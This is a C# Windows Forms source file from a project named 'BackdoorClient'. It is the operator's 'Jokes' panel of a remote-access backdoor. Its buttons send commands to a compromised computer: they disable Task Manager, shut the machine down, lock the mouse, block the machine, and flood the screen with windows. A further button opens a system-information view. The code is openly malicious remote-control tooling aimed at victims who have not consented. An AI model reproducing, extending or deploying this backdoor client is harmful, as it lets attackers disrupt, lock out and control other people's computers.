using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BackdoorClient
{
    public partial class Jokes : Form
    {
        private Form1 mainForm;

        public Jokes(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }

        private void Jokes_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
            
                this.Close();
                return;
            }
        }

        private void disebleTaskMgr_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"enTaskmgr $false");
        }

        private void enebleTaskMgr_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"enTaskmgr $true");
        }

        private void shutdownMachine_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"cmd $shutdown /s /t 1");
        }

        private void lockMouse_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"curblock $true");
        }

        private void unLockMouse_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"curblock $false");
        }

        private void blockMachine_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"block $true");
        }

        private void unblockMachine_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"block $false");
        }

        private void dirtyScreen_Click(object sender, EventArgs e)
        {
            string args = "";
            args += "<arguments>";
            args += "<windowsValue>" + dirtyScreenValue.Value + "</windowsValue>";
            args += "<moveWindows>" + moveDirtyWindows.Checked.ToString() + "</moveWindows>";
            args += "</arguments>";
            mainForm.SendCommandAndGetResponce($"dirtyScreen $true {args}");
        }

        private void clearScreen_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"dirtyScreen $false");
        }

        private void getSysInfBut_Click(object sender, EventArgs e)
        {
            SystemInf systemInf = new SystemInf(mainForm);
            systemInf.Show();
        }
    }
}
